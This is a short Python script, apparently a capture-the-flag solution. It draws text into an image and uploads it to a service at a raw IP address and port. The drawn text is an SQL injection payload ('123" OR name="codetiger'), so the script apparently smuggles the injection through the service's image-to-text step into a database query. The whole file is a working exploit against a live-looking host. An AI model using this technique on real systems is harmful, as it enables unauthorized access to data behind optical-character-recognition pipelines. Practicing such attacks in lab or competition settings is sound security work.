import requests
import json
import io
from PIL import Image, ImageDraw, ImageFont


def create_image(text):

    font = ImageFont.truetype("Arial.ttf", 50)
    img_width, img_height = (1000, 100)
    img = Image.new('RGB', (img_width, img_height), (255, 255, 255))
    d = ImageDraw.Draw(img)
    text_width = d.textlength(text)
    d.text((100, 20), text, fill=(0, 0, 0), font=font)
    img.save("plate.jpg")
    img_byte_arr = io.BytesIO()
    img.save(img_byte_arr, format='PNG')
    img_byte_arr = img_byte_arr.getvalue()
    return img_byte_arr


def upload(img_bytes):
    url = 'http://34.130.180.82:59024/'
    r = requests.post(url + 'api', files={'file': img_bytes})
    print(r.text)


upload(create_image('123" OR name="codetiger'))
